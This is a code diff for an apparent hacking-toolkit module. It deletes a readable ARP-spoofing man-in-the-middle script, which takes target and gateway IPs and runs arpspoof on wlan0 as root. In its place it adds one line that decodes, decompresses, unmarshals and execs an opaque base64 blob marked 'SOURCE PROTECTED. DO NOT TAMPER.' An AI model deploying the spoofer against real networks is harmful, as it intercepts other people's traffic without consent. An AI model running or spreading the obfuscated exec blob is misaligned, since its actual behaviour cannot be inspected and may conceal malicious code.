@@ -1,28 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, time
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-# CREATED BY: RAMIZ UDDIN
-import cyber_deps
-cyber_deps.ensure_deps(system_pkgs=["dsniff"])
-import os
-def run():
-    while True:
-        print("\033[1;32m[*] ", end=""); print("\n\033[1;31m[*] ARP Spoofer (Man-in-the-Middle Simulation)\033[0m")
-        if os.geteuid() != 0:
-            print("\033[1;32m[*] ", end=""); print("[!] This tool requires ROOT access. Run with 'tsu'.")
-            break
-        target_ip = input("\nEnter Target IP (or '0' to exit): ")
-        if target_ip == '0': break
-        gateway_ip = input("Enter Gateway/Router IP: ")
-        print("\033[1;32m[*] ", end=""); print(f"[*] Starting ARP Spoofing: {target_ip} <-> {gateway_ip}")
-        print("\033[1;32m[*] ", end=""); print("[*] Press Ctrl+C to Stop.")
-        os.system(f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}")
-        input("\n[Press Enter to Return]")
-if __name__ == "__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVVM1P3EYUH6/t/bAXSBCQwiZ0Qg/EoOWjhFRxKCpfbbcUgmxWbbqLVu7usOt017sd2yL4VPVSlB6SqqpKD5U4kioHzv0LcrRgoyB3bz1UvaXhH+iMHdhNWTXKSJ6Z9968937z3s/zJ2gZ3Mv1xCDTT0AFKrMMcLAymFFDAwCHfInFbJZVouDcGAIqO86o3E0GNv154sdnw2pY/hwAjXhl+SEw/dIDgiJTZKTI31RYzTMtwXjysRTPbz6ezJlBCbXNzEwzpzEz/KleDbXVsmmgRM5HOUXVCaba+3FttXxTWwRSeNXj82WkYed6IjN5a+pG5f03GU4Y+sO5EqwLytLc+tIinL8jQ2VuJfUFTC8upladyTeKmshMVCTOC1VNL2xumxaqeHwN64bl8XathrDEeJyhVZBJbwI94IlWtVrOlZBWQBiLIKCHOUumb0CDC3+X+ja1U6xzfQ0u5gpv1zlINjsfPrz+s/yD/OPMwzFXuFrnhnyrVOdG/M3lp9yVE1onL1wwDX1zk2QVAzS52ldFM9/ai/Bp++8xtP2DIHNGDpWQUWVvhmCrrrU1ZwRROHBuNMmn8vIWoWQfeF3scGuDM2fEUSOnegOkgRr1CU40r5yJnZ1hXpNFSBPiqWKaIfRrvc3/e8Xb3rv9z9nhZ+g8l6GJtqupXfkdAOnCqiP6LH63khnZgFggJtI1FhkFRxZ8y6RvmVPWoFqrVjcRhtdWNCOpG0mrhJIreqFQRlDVK3ZZs/SqIVEqYorUmcpc3YDrJd2ElGwQo69tHSMTKrdvr0Mtn0emOQYV24BbulWCw5ZpD4857whLhkWSrGu4iCyYWoPXqhgOTwyTIBDd0y1Jhh4z4fQHxz7SLLSlbY8rVZuKqTUZOgkKWLU0bOlGsYmcCMTIw5nkLHT66Zk1gsaECxYujy7Q8KpVrY05vRqumdQBJnW4VdaMCZi0SE7ovCVkApcgN/FQkGVjY0PiMa0xpm+GFyG4ka0XPF43araFKdOlkBez/Bvl9JonFAPUZG/SSsGg8B6LbQNfIrsu8pmkP+RnPBY6G9EOt3Nwb/4wOvy41x3HdclsiB0P5Pvy9zO7k0fi5Ub8ots9tB86jI8+TrtTpXpSP45fbPT0uwMfHPXM7cSOxZ5d9khM7KYbvQNu4sZR73s7wqthJz99cufJsvtZ1t0outmSO67Xpbv/yfxJXVpuRIUHsfsxt0fal/YTB3MHdw+ybvd8PbrgH5bq0ZF/LgGxC8fpjaK5XEXTjVxOigTF4Sy9gvwHxxPy218inCugmumJyDBtjHzBrwD1pA9WLvcI+KGCCkVnKtWCXUazeJCIlMvmLTI9ZxmG+Qt0veB4ZvDkAmC6j4HwDPQdgr69j/fkQzD2B4i9CMWZ0ecDgIvvOEds/y9Tv067bL8f/F8oCoZz'))))
